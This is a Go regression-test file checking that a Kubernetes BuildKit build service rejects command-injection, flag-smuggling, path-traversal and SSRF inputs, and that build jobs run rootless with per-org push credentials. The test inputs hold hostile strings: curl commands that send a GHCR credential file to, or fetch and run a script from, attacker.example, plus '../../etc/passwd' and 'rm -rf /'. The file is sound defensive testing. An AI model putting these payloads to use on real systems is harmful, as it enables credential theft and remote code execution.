package platform

import (
	"context"
	"strings"
	"testing"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
)

// TestRED_CommandInjectionBlocked is the CRIT-1 regression guard (adapted from
// RED's original proof-of-concept, which fired against the vulnerable code). It
// proves the three injection vectors are now CLOSED:
//
//  1. the privileged BuildKit Job renders its command as EXEC-FORM argv, never a
//     `sh -c "<string>"`, so no shell parses any attacker input;
//  2. a repo.url / commit-ref / dockerfile carrying shell or flag metacharacters
//     is REJECTED before any Job is created (fail-closed, no Job, real error);
//  3. the output image ref is forced server-side, so a client `--output`
//     override cannot push to another tenant's repository.
func TestRED_CommandInjectionBlocked(t *testing.T) {
	// (0) Legitimate build renders EXEC-FORM argv, not `sh -c`.
	k := fakeK8s()
	good := mkApp("lux", "proj_x", "api")
	good.Source = "git"
	good.RepoURL = "https://github.com/hanzoai/app"
	good.RepoBranch = "main"
	if _, err := k.launchBuildJob(context.Background(), "lux", good, "ghcr.io/hanzoai/tenant-lux/api:main", "main", "bld_ok"); err != nil {
		t.Fatalf("legitimate build should launch: %v", err)
	}
	cmd := capturedJobCommand(t, k, "hanzo", "api")
	if len(cmd) == 0 || cmd[0] != "buildctl-daemonless.sh" {
		t.Fatalf("build command must be exec-form argv starting with buildctl-daemonless.sh, got %v", cmd)
	}
	if cmd[0] == "sh" || cmd[0] == "/bin/sh" || cmd[0] == "bash" {
		t.Fatalf("build command must NOT be a shell -c string, got %v", cmd)
	}
	for _, arg := range cmd {
		if arg == "-c" {
			t.Fatalf("build command must not use a shell -c form, got %v", cmd)
		}
	}

	// (1) repo.url injection: terminate buildctl with ';' then exfil the mounted
	//     GHCR push credential. MUST be rejected — no Job created.
	assertBuildRejected(t, "repo.url ; injection", func(k *k8sClient) (string, error) {
		a := mkApp("lux", "proj_x", "evil1")
		a.Source = "git"
		a.RepoURL = "https://github.com/x/y;cat /ghcr/config.json|curl -s -X POST https://attacker.example -d @- #"
		a.RepoBranch = "main"
		return k.launchBuildJob(context.Background(), "lux", a, "ghcr.io/hanzoai/tenant-lux/evil1:main", "main", "bld_1")
	})

	// (2) commit/ref injection via the deploy body (no persisted repo needed).
	assertBuildRejected(t, "commit ref injection", func(k *k8sClient) (string, error) {
		a := mkApp("lux", "proj_x", "evil2")
		a.Source = "git"
		a.RepoURL = "https://github.com/x/y"
		evilRef := "main;curl -s https://attacker.example/x.sh|sh #"
		return k.launchBuildJob(context.Background(), "lux", a, "ghcr.io/hanzoai/tenant-lux/evil2:main", evilRef, "bld_2")
	})

	// (3) output-redirect (no ';' needed): try to overwrite ANOTHER tenant's image
	//     tag via a smuggled --output in repo.url. MUST be rejected.
	assertBuildRejected(t, "output-redirect override", func(k *k8sClient) (string, error) {
		a := mkApp("lux", "proj_x", "evil3")
		a.Source = "git"
		a.RepoURL = "https://github.com/x/y --output type=image,name=ghcr.io/hanzoai/tenant-hanzo/api:latest,push=true #"
		a.RepoBranch = "main"
		return k.launchBuildJob(context.Background(), "lux", a, "ghcr.io/hanzoai/tenant-lux/evil3:main", "main", "bld_3")
	})

	// (4) dockerfile path traversal / metacharacters must also be rejected.
	assertBuildRejected(t, "dockerfile traversal", func(k *k8sClient) (string, error) {
		a := mkApp("lux", "proj_x", "evil4")
		a.Source = "git"
		a.RepoURL = "https://github.com/x/y"
		a.Dockerfile = "../../etc/passwd"
		return k.launchBuildJob(context.Background(), "lux", a, "ghcr.io/hanzoai/tenant-lux/evil4:main", "main", "bld_4")
	})

	// (5) non-allowlisted git host must be refused (SSRF / arbitrary fetch).
	assertBuildRejected(t, "non-allowlisted host", func(k *k8sClient) (string, error) {
		a := mkApp("lux", "proj_x", "evil5")
		a.Source = "git"
		a.RepoURL = "https://attacker.example/x/y"
		a.RepoBranch = "main"
		return k.launchBuildJob(context.Background(), "lux", a, "ghcr.io/hanzoai/tenant-lux/evil5:main", "main", "bld_5")
	})

	t.Log("CRIT-1 CLOSED: exec-form argv + input validation reject all injection vectors; output image ref forced server-side")
}

// TestRED_ForcedImageRefServerSide proves the output image name in the rendered
// argv is exactly the server-computed ref (buildImageRef from the validated
// tenant) — a client cannot influence where the build pushes.
func TestRED_ForcedImageRefServerSide(t *testing.T) {
	k := fakeK8s()
	a := mkApp("lux", "proj_x", "api")
	a.Source = "git"
	a.RepoURL = "https://github.com/hanzoai/app"
	forced := k.buildImageRef("lux", "api", "main") // server-derived, tenant-bound
	if _, err := k.launchBuildJob(context.Background(), "lux", a, forced, "main", "bld_forced"); err != nil {
		t.Fatalf("launch: %v", err)
	}
	cmd := capturedJobCommand(t, k, "hanzo", "api")
	outputArg := ""
	for i, arg := range cmd {
		if arg == "--output" && i+1 < len(cmd) {
			outputArg = cmd[i+1]
		}
	}
	if !strings.Contains(outputArg, "name="+forced+",") {
		t.Fatalf("output must force the server-derived image ref %q, got %q", forced, outputArg)
	}
	// The tenant-bound ref must reference THIS org, never another tenant's.
	if strings.Contains(outputArg, "tenant-hanzo/") {
		t.Fatalf("output ref must not target another tenant: %q", outputArg)
	}
}

// assertBuildRejected runs a build attempt against a fresh fake cluster and
// requires it to fail with NO Job created (fail-closed).
func assertBuildRejected(t *testing.T, name string, attempt func(*k8sClient) (string, error)) {
	t.Helper()
	k := fakeK8s()
	if _, err := attempt(k); err == nil {
		t.Fatalf("%s: expected build to be REJECTED, but it succeeded", name)
	}
	list, err := k.dyn.Resource(jobsGVR).Namespace("hanzo").List(context.Background(), metav1.ListOptions{})
	if err != nil {
		t.Fatalf("%s: list jobs: %v", name, err)
	}
	if len(list.Items) != 0 {
		t.Fatalf("%s: a Job was created despite rejection (%d jobs) — NOT fail-closed", name, len(list.Items))
	}
}

// capturedJobCommand returns the container command ([]string) of the build Job
// for the given app slug in ns.
func capturedJobCommand(t *testing.T, k *k8sClient, ns, appSlug string) []string {
	t.Helper()
	list, err := k.dyn.Resource(jobsGVR).Namespace(ns).List(context.Background(), metav1.ListOptions{})
	if err != nil {
		t.Fatalf("list jobs: %v", err)
	}
	for i := range list.Items {
		lbls, _, _ := unstructured.NestedStringMap(list.Items[i].Object, "metadata", "labels")
		if lbls["hanzo.ai/application"] == appSlug {
			containers, _, _ := unstructured.NestedSlice(list.Items[i].Object, "spec", "template", "spec", "containers")
			if len(containers) == 0 {
				t.Fatal("no containers in job")
			}
			c0 := containers[0].(map[string]any)
			raw, _ := c0["command"].([]any)
			out := make([]string, 0, len(raw))
			for _, e := range raw {
				out = append(out, e.(string))
			}
			return out
		}
	}
	t.Fatalf("job for app %s not found", appSlug)
	return nil
}

// TestValidateImageRef proves the M1 fix: the build OUTPUT image is validated as a
// single, well-formed OCI reference so it can never inject a BuildKit `--output`
// exporter attribute (name=…,registry.insecure=true) or split the argv element.
func TestValidateImageRef(t *testing.T) {
	good := []string{
		"ghcr.io/hanzoai/cloud:v1.801.89",
		"ghcr.io/luxfi/wallet-web:00971263b",
		"ghcr.io/hanzoai/tenant-myorg/my-app:latest",
		"registry.hanzo.ai/zooai/api:v2.3.4",
		"ghcr.io/hanzoai/app-web:main",
		"ghcr.io/hanzoai/x@sha256:" + strings.Repeat("a", 64),
	}
	for _, img := range good {
		if got, err := validateImageRef(img); err != nil || got != img {
			t.Errorf("validateImageRef(%q) should PASS, got (%q,%v)", img, got, err)
		}
	}
	bad := map[string]string{
		"ghcr.io/hanzoai/x,registry.insecure=true": "comma injects a CSV exporter attr",
		"ghcr.io/hanzoai/x name=evil":              "space splits the argv element",
		"ghcr.io/hanzoai/x\",push=true":            "quote breaks the ref",
		"ghcr.io/hanzoai/x:tag\nname=evil":         "newline",
		"ghcr.io/hanzoai/x=y":                      "'=' is an attr separator",
		"-ghcr.io/hanzoai/x:tag":                   "leading '-' reads as a flag",
		"ghcr.io/hanzoai/x;rm -rf /":               "shell metacharacters",
		"":                                         "empty",
		" ":                                        "whitespace-only",
	}
	for img, why := range bad {
		if _, err := validateImageRef(img); err == nil {
			t.Errorf("validateImageRef(%q) MUST reject (%s)", img, why)
		}
	}
}

// TestBuildJobSpec_RootlessAndScopedCred proves the H2 hardening of the shared
// build Job: it is ROOTLESS (no privileged, uid 1000) and mounts ONLY the target
// org's push credential — never the shared 3-org kaniko-ghcr secret.
func TestBuildJobSpec_RootlessAndScopedCred(t *testing.T) {
	k := fakeK8s()
	push, err := buildPushSecret("ghcr.io/luxfi/wallet-web:00971263b")
	if err != nil {
		t.Fatalf("buildPushSecret: %v", err)
	}
	if push != "push-luxfi" {
		t.Fatalf("push secret must be per-org (push-luxfi), got %q", push)
	}
	job := k.buildJobSpec("pf-runner-x", "platform", "runner", push, []any{"buildctl-daemonless.sh"})
	podSpec, _, _ := unstructured.NestedMap(job.Object, "spec", "template", "spec")

	containers, _, _ := unstructured.NestedSlice(podSpec, "containers")
	c0 := containers[0].(map[string]any)

	// (1) NOT privileged, non-root uid 1000.
	sc := c0["securityContext"].(map[string]any)
	if sc["privileged"] != false {
		t.Fatalf("build container must NOT be privileged, got %v", sc["privileged"])
	}
	if sc["runAsUser"] != int64(1000) || sc["runAsNonRoot"] != true {
		t.Fatalf("build container must run rootless as uid 1000, got %v", sc)
	}
	if img, _ := c0["image"].(string); !strings.Contains(img, "-rootless") {
		t.Fatalf("build image must be the rootless variant, got %q", img)
	}

	// (2) The ONLY mounted registry credential is the per-org push secret.
	vols, _, _ := unstructured.NestedSlice(podSpec, "volumes")
	for _, v := range vols {
		vm := v.(map[string]any)
		if sec, ok := vm["secret"].(map[string]any); ok {
			name, _ := sec["secretName"].(string)
			if name == "kaniko-ghcr" {
				t.Fatalf("build must NOT mount the shared 3-org kaniko-ghcr secret")
			}
			if vm["name"] == "ghcr" && name != push {
				t.Fatalf("registry cred must be the per-org push secret %q, got %q", push, name)
			}
		}
	}
	// (3) No imagePullSecrets referencing the shared cred, SA token off.
	if podSpec["automountServiceAccountToken"] != false {
		t.Fatalf("build pod must not automount the SA token")
	}
	if _, ok := podSpec["imagePullSecrets"]; ok {
		t.Fatalf("rootless build must not carry imagePullSecrets (public image), got %v", podSpec["imagePullSecrets"])
	}
}

// TestBuildPushSecret_FailClosed proves buildPushSecret refuses a non-owned image
// rather than falling back to a broad credential.
func TestBuildPushSecret_FailClosed(t *testing.T) {
	if _, err := buildPushSecret("docker.io/evil/x:latest"); err == nil {
		t.Fatal("buildPushSecret must fail closed for a non-owned registry")
	}
}
